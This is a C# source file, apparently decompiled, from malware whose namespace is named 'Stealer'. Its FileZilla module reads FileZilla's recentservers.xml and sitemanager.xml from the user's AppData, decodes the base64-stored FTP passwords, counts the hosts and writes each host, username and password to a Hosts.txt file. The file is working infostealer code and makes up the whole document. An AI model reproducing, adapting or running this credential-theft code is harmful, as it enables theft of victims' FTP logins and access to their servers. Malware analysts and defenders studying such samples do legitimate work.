using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace Stealer
{
	// Token: 0x02000018 RID: 24
	internal sealed class FileZilla
	{
		// Token: 0x06000081 RID: 129 RVA: 0x00005004 File Offset: 0x00003204
		private static string[] GetPswPath()
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
			return new string[]
			{
				str + "recentservers.xml",
				str + "sitemanager.xml"
			};
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00005048 File Offset: 0x00003248
		public static List<Password> Steal()
		{
			List<Password> list = new List<Password>();
			string[] pswPath = FileZilla.GetPswPath();
			if (!File.Exists(pswPath[0]) && !File.Exists(pswPath[1]))
			{
				return list;
			}
			foreach (string text in pswPath)
			{
				try
				{
					if (File.Exists(text))
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						foreach (object obj in xmlDocument.GetElementsByTagName("Server"))
						{
							XmlNode xmlNode = (XmlNode)obj;
							Password item = default(Password);
							item.sUrl = string.Concat(new string[]
							{
								"ftp://",
								xmlNode["Host"].InnerText,
								":",
								xmlNode["Port"].InnerText,
								"/"
							});
							item.sUsername = xmlNode["User"].InnerText;
							item.sPassword = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode["Pass"].InnerText));
							Counter.FTPHosts++;
							list.Add(item);
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}

		// Token: 0x06000083 RID: 131 RVA: 0x000051DC File Offset: 0x000033DC
		private static string FormatPassword(Password pPassword)
		{
			return string.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00005200 File Offset: 0x00003400
		public static void WritePasswords(List<Password> pPasswords, string sSavePath)
		{
			if (pPasswords.Count != 0)
			{
				Directory.CreateDirectory(sSavePath);
				foreach (Password pPassword in pPasswords)
				{
					File.AppendAllText(sSavePath + "\\Hosts.txt", FileZilla.FormatPassword(pPassword));
				}
			}
		}
	}
}
